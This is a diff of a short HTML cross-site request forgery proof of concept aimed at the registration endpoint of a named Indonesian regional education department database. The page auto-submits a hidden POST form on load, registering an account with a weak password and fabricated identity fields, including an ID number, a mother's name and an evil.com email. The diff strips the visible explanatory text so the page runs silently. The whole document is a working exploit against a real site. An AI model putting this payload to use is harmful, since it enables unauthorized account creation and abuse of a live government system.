@@ -1,21 +1,14 @@
-<!DOCTYPE html>
 <html>
-<head>
-  <title>CSRF PoC</title>
-</head>
 <body onload="document.forms[0].submit()">
 
-<h2>CSRF Proof of Concept</h2>
-<p>If you see this page, CSRF exploit is running...</p>
-
 <form action="https://db.ldpi.disdik.padang.go.id/home/regis" method="POST">
-  <input type="hidden" name="userid" value="csrf_poc">
+  <input type="hidden" name="userid" value="csrf_PROOF_173">
   <input type="hidden" name="password" value="123456">
-  <input type="hidden" name="anak" value="x">
-  <input type="hidden" name="nik" value="999">
-  <input type="hidden" name="ibu" value="y">
-  <input type="hidden" name="email" value="csrf@evil.com">
-  <input type="hidden" name="hp" value="0813">
+  <input type="hidden" name="anak" value="anak_csrf_173">
+  <input type="hidden" name="nik" value="99999173">
+  <input type="hidden" name="ibu" value="ibu_csrf_173">
+  <input type="hidden" name="email" value="proof173@evil.com">
+  <input type="hidden" name="hp" value="0812173173">
 </form>
 
 </body>
